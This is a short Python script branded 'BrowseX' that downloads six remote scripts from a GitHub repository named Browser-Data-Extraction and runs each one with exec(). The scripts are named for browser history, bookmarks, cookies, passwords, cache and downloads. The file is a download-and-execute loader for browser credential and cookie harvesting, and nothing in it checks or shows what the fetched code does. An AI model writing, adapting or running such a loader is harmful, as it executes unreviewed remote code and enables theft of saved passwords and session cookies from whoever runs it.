import sys
import pyfiglet
import requests
import ast
import importlib
import subprocess

def download_script(script_url):
    try:
        response = requests.get(script_url)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error downloading {script_url}: {e}")
        return None

def run_script(script_url):
    script_content = download_script(script_url)
    if script_content:
        try:
            exec(script_content, globals())
        except Exception as e:
            print(f"Error running the script from {script_url}: {e}")
    else:
        print(f"Failed to download script from {script_url}")

def run_all_scripts():
    scripts = [
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/history.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/bookmarks.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/cookies.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/passwords.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/cache.py",
        "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/downloads.py"
    ]
    
    for script in scripts:
        run_script(script)
    
    print("\nAll scripts have been executed.")

def print_banner():
    banner = pyfiglet.figlet_format("BrowseX")
    print(banner)
    print("\n===============", "\nMade by Cr0mb", "\n===============")

def main():
    print_banner()
    run_all_scripts()

if __name__ == "__main__":
    main()
